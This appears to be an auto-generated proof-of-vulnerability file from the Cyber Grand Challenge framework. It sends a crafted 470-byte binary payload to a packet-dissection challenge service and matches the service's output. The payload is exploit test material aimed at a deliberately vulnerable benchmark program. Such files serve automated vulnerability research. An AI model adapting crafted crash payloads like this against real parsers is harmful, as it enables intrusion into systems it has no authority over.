#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd6\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbe\x01\x00\x00\xb6\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb6\x01\x00\x00"
         "\xf7\x5c\x2c\xe4\x68\x50\xeb\x5d\x6f\x01\x3f\x49\xd4\xa0\x18\x4d"
         "\x4f\xdc\x6e\x5b\x19\x00\x00\x00\x01\xe5\xde\x94\x6e\x84\x23\x27"
         "\x11\xd9\x77\x2b\xb7\xf0\x70\x11\x4d\x8e\x01\x00\x25\x01\x00\x21"
         "\x01\x19\x57\xe3\x01\xad\x01\x00\xc6\x49\xdd\x2b\x68\x77\x6b\xcc"
         "\x87\x01\x00\x91\x41\x00\xb3\xf4\xcf\x8b\x04\x46\xff\xff\x7b\x8b"
         "\x8c\x9d\xfe\xb6\xb9\xea\xd0\xe9\x1f\x75\x58\xd3\x28\x3f\xff\x3f"
         "\xaf\x5e\xbe\x58\x5f\xe9\x92\x76\xe1\x01\xeb\xfe\xd6\x32\xad\x3f"
         "\xf4\xd0\x6d\x69\xaf\x9d\xc3\x3f\x69\x57\x0a\x56\x10\x86\xb2\xe9"
         "\xca\x99\x9d\x54\x0a\x3a\x0e\x16\xed\x0c\x0e\xbf\x79\x52\x42\x9c"
         "\xb2\x61\x7a\x12\x78\xc0\x00\xcd\xd9\xdf\xc3\x11\x87\x00\x52\x17"
         "\xa7\xc7\x08\x63\x33\x52\x1a\x26\x2f\xe2\x1e\x8c\x64\x0a\xb5\xf2"
         "\x6f\xd6\xda\x70\x65\x32\x45\x78\xcf\x07\xee\x71\x31\xa7\xa4\x3d"
         "\x33\x8b\x82\x87\xb8\x3a\xba\x36\xee\xdc\xe9\x0c\xbf\x10\x8c\x7f"
         "\x33\x2f\x1e\xb8\x2f\x36\xe0\x8c\xa6\x9a\x0f\x0d\xe4\xc8\x2e\x45"
         "\x47\x86\x69\x09\x1d\x93\x42\x9f\x0d\xbe\x76\x9c\x29\xc7\x4b\x8c"
         "\x53\xe9\x04\x80\xc5\x80\xb5\xa9\xab\xf5\xfb\xc4\xfc\xfa\xc2\xc9"
         "\x32\x9b\xfe\x9a\xae\x94\x65\x23\xf0\x35\x0f\xdf\x1d\x9f\x60\x5a"
         "\x81\xc9\xd3\x0b\x64\x99\xbb\x77\xfe\x39\x91\x28\x31\xb4\x01\xdc"
         "\xb6\x41\x42\x82\xc5\x6a\x2e\x6e\x7b\xa0\x3b\x95\x97\x06\xbb\x4d"
         "\x12\x96\x47\x5e\xc9\x85\xf9\x47\x9d\xd8\xcb\x4b\xbd\x84\x77\x78"
         "\xca\xab\xff\xef\x63\x19\xf9\x6b\x77\x27\x51\x03\x51\x3c\x0a\xbb"
         "\x97\x11\x43\x3e\xe4\x43\xd0\xbf\xe0\x6a\xa1\x87\x8a\x42\xf1\x4c"
         "\x49\x18\x01\x00\x9c\xfb\xfe\x72\xc8\x62\x4e\x40\xd9\x41\x00\xff"
         "\x53\x29\xba\x28\x4c\xce\xc0\xf3\x41\x00\x01\x32\x25\x97\x01\x77"
         "\xc6\x62\x41\x00\x3a\x4f\xda\xcc\x01\x91\x01\x24\x01\x00\x79\x01"
         "\x22\x41\x00\x41\x00\xd6\x50\x8c\xb2\xfb\x12\xd5\x5d\x00\x12\x01"
         "\x00\xdc\x41\x00\x12\x24\xaf\xd4\x59\xdd\x36\x87\x01\xde\xed\xcf"
         "\x07\x9a\x0f\xbf\xc6\x11";
      static unsigned int write_00001_00000_len = 470;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamamarket
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x6d\x61\x72\x6b\x65\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
